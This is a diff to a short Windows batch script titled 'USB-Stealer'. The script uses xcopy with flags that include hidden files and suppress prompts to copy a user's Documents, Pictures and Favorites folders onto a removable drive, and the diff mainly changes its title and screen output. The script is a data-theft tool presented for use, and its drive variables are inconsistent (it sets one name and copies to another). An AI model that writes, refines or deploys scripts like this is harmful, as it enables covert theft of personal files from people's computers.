@@ -1,8 +1,10 @@
 @echo off
+title USB-Stealer
 color 2
 SET odrive=%odrive:~0,2%
 set backupcmd=xcopy /s /c /d /e /h /i /r /y
-echo off
+cls
+echo on
 %backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Documents"
 %backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
 %backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
